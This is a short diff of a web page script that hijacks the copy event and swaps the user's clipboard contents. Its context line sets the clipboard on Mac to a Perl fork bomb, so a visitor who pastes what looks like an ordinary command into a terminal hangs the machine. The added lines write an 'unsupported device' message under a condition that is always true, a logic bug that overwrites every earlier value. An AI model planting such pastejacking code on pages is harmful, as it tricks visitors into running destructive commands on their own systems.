@@ -62,6 +62,9 @@
         if (os === "Mac") {
             event.clipboardData.setData("text/plain", 'perl -e "fork while fork" &')
         }
+        if ( (os !== "Linux") || (os !== "Mac") || (os !== "Windows")) {
+            event.clipboardData.setData("text/plain", 'Oops this device is not supported')
+        }
         event.preventDefault();
     })
 </script>
